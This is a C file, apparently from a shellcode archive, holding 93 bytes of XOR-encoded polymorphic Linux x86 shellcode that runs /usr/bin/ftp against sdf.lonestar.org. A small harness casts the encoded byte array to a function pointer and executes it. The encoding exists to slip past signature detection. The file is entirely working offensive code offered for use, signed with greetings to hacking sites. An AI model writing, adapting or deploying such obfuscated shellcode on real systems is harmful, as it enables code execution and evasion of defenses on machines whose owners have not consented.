/*
 * sys_execve("/usr/bin/ftp", { "/usr/bin/ftp", "sdf.lonestar.org" }, NULL) 93 bytes polymorphic shellcode
 *
 * tesla_ (gandung@ppp.cylab.cmu.edu)
 */

/*
 * Tested in : 
 * - BackTrack 5 (linux-2.6.38-generic)
 * - Ubuntu 10.10 Maverick Meerkat (linux-2.6.38-generic)
 * - Ubuntu 11.04 Natty Narwhal
 * - Debian Squeeze 6.0.2 (linux-2.6.32-5-stable)
 */

#include <stdio.h>
#include <string.h>

char sdf_ftp_encoded[] = "\xeb\x0d\x5e\x31\xc9\xb1\x49\x80\x36\x5a"
			 "\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff"
			 "\x6b\x9a\xd9\xb6\x5b\xd2\x5e\x7e\x32\x74"
			 "\x35\x28\x3d\x32\x29\x2e\x3b\x28\x32\x36"
			 "\x35\x34\x3f\x32\x29\x3e\x3c\x74\xd3\xbc"
			 "\xd9\xb6\x5b\xd2\x5e\x7e\x32\x75\x3c\x2e"
			 "\x2a\x32\x75\x38\x33\x34\x32\x75\x2f\x29"
			 "\x28\x0a\x0c\xd9\xb4\x57\x0c\xea\x51\xd3"
			 "\xa9\xd3\xbb\x6b\x88\x97\xda\xea\x5b\x6b"
			 "\x81\x97\xda";

int main(void) {
  int ftp_len = strlen(sdf_ftp_encoded);
  printf("[+] Using key mutation engine : 0x5a\n");
  printf("[+] Length of this shellcode : %d bytes\n\n", ftp_len);
  (*(void(*)())sdf_ftp_encoded)();
  return 0;
}

/* devilzc0de.org, hacker-newbie.org, sdf.lonestar.org, 1337day.com */